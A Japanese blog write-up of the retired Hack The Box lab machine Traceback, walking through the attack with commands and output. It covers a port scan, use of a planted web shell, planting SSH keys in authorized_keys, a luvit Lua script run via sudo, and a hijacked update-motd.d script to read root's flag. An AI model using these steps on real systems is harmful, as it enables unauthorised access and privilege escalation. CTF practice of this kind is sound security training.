---
title: "Hack The Box: Traceback"
date: 2020-08-21T17:30:00+09:00
tags:
  - hack-the-box
---

最近 [Hack The Box](https://app.hackthebox.eu/login) というものにハマっています。  
これはざっくり説明するとペネトレーションテストの実力を試せる Web サイトです。
サービス側から `.ovpn` ファイルとその VPN 上にある脆弱なマシンの IP アドレスが提供されるので、そこにポートスキャンしたり SQL インジェクションしたりして root 権限を奪取するというものです。  

マシンは複数台あり、 Active なマシンを攻略するとレートが付きます。ほぼネトゲです。  
各マシンは 20 週間位で Retire してレートがつかなくなります。  
1 週間ごとに一番古いマシンが 1 つリタイアして 1 つアクティブなマシンが追加されるようになっていて、 Active なマシンが大体 20 個あるので 20 週間くらいです。  
Retire したマシンのみ write up を書いて良いということになっています。

Challenge というクイズ的な問題もあるのですが、これは自分はやったことが無いので特に触れません。

自分は HTB を初めて日が浅いのですが初めて解いた問題がリタイアしたので記念と自慢として write up を残します。

## write up

[Traceback](https://app.hackthebox.eu/machines/233) を解きました。
Linux マシンです。難易度は Easy です。

### ポートスキャン

まずどんなサービスが動いているか確認します。

```
$ nmap -A 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 03:20 EDT
Nmap scan report for 10.10.10.181
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.72 seconds
```

`ssh`, `http` が出来そうです。

### foothold

`curl` で HTML を見てみると以下のような記述があります。

```html
<body>
        <center>
                <h1>This site has been owned</h1>
                <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
                <h3> - Xh4H - </h3>
                <!--Some of the best web shells that you might need ;)-->
        </center>
</body>
```

`best web shells` がバックドアとして残されているようです。  
「`best` なんて人によるだろ」と思い作問者の名前 (`xh4h`) + `web shell` でググると [https://twitter.com/riftwhitehat/status/1237311680276647936](https://twitter.com/riftwhitehat/status/1237311680276647936) が見つかります。  
このリポジトリをクローンしてきて雑に `for path in (ls | grep -v README); curl 10.10.10.181/$path; echo $path; end` とかすると `smevk.php` が見つかります。
`smevk.php` のデフォルトユーザ名、パスワードでログイン出来るのでこれで任意コード実行が出来るようになりました。

### user login

`smevk.php` で `user.txt` を入手したいですが、ログイン中のユーザではそれが無いです。

```
$ ls -al /home/$(whoami)
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
```

`smevk.php` のコンソールは使いにくいしユーザ名も分かったし、 `ssh` 接続を試みます。

ますクライアントマシンでキーペア生成します。

```
$ ssh-keygen -f ~/.ssh/traceback
```

`smevk.php` のコンソールからこんな感じで生成した `~/.ssh/traceback.pub` をアップロードします。

```
mkdir -p /home/webadmin/.ssh/ && echo "ssh-rsa xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxx" > /home/webadmin/.ssh/authorized_keys && cat /home/webadmin/.ssh/authorized_keys
```

これで SSH すると無事に安定したシェルを得られます。

```
$ ssh -i ~/.ssh/traceback webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ 
```

先程の `ls` の結果を見つめ直すと `note.txt`, `.luvit_history` の興味深いファイルが見つかります。
前者の内容は以下です。後者は空でした。

```
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Lua の練習ツールを `sysadmin` が残してくれたらしいです。

続いてホームディレクトリ内のファイルを順番に見ていると以下のような興味深い履歴が見つかります。

```
$ cat /home/webadmin/.bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
```

どうやら `luvit` で権限昇格が出来るようです。  
[`luvit`](https://luvit.io/) は Node.js の API を使える Lua の処理系らしいです。  
これを使って `sysadmin` に `ssh` 出来るように `/home/sysadmin/.ssh/authorized_keys` の作成を試みます。

以下のコードを `/home/webadmin/privesc.lua` として書きます。キーの内容はクライアントマシンの `~/.ssh/traceback.pub` です。

```lua
local fs = require('fs')

fs.mkdirSync('/home/sysadmin/.ssh')

local pubkey = 'ssh-rsa xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxx'
fs.writeFileSync('/home/sysadmin/.ssh/authorized_keys', pubkey)
```

これを `.bash_history` に従って以下のように実行すると無事に正常終了します。

```
$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
```

これで `sysadmin` に `ssh` 出来るようになって `user.txt` が取れました！

```
$ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 21 00:47:10 2020 from 10.10.14.11
$ bash
sysadmin@traceback:~$ cat user.txt 
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### root login

まず [`linPEAS`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) を流します。

クライアントマシンでダウンロード、 scp でターゲットマシンに送りつけます。
ターゲットマシンで `curl` or `wget` が使えれば楽なのですが、 名前解決で失敗していたのでこうしています。

```
$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
$ chmod u+x linpeas.sh
$ scp -i ~/.ssh/traceback linpeas.sh sysadmin@10.10.10.181:/home/sysadmin/linpeas.sh
```

実行すると以下の辺りが黄色くなっています。

```
sysadmin@traceback:~$ ./linpeas.sh 

... 省略 ...

[+] Interesting GROUP writable files (not in Home) (max 500)                  
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group sysadmin:                                                             
/etc/update-motd.d/50-motd-news                                               
/etc/update-motd.d/10-help-text                                               
/etc/update-motd.d/91-release-upgrade                                         
/etc/update-motd.d/00-header                                                  
/etc/update-motd.d/80-esm                                                     
/home/webadmin/note.txt                                                       
/dev/mqueue/linpeas.txt    

... 省略 ...
```

`/etc/upated-motd.d` 以下はログイン時に出るバナーなどを実装しているシェルスクリプトのようです。
root 権限で動作するらしいので、ここで `/root/root.xt` の表示を試みます。

```
$ nano /etc/update-motd.d/00-header

# cat /root/root.txt を追加
```

これで SSH し直すとバナーと一緒に `root.txt` も出力されます！

```
$ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 21 00:56:10 2020 from 10.10.14.11
$
```

## 感想

最初から Web Shell がしかけられてるシチュエーションなんてあるかよ、という気持ちもあったのですがイタズラ的にマシンを乗っ取られてそれを取り返すというシチュエーションだと思うと、ある程度は納得出来る問題でした。  

初めての問題で何も分からない状態からのスタートでしたが、リタイアした別マシンの write up を読んで使うべきツールなり定石なりを把握すると割とすんなり解けました。  
実際仕事終わりに問題に取り組んで 2 日間くらいかかってしまったのですが、終わってみると「やるだけ」だったなという感想です。  

そもそも始めたきっかけは [ハッキングという言葉に憧れるエンジニア達に贈る Hack the Box 入門](https://speakerdeck.com/sanposhiho/hatukingutoiuyan-xie-nichong-reruenziniada-nizeng-ru-hack-the-box-ru-men) を見たことなのですが、
これを最初に見たとき「これが Easy なら自分には厳しいな」という印象を持ったのですが、やってみれば割とこなせたので少し自分に自信がつきました。  
良い経験だったと思います。

今の自分は Script Kiddie という大変不名誉なランクなので Hacker になるまでは続けようと思います。

https://app.hackthebox.eu/profile/367637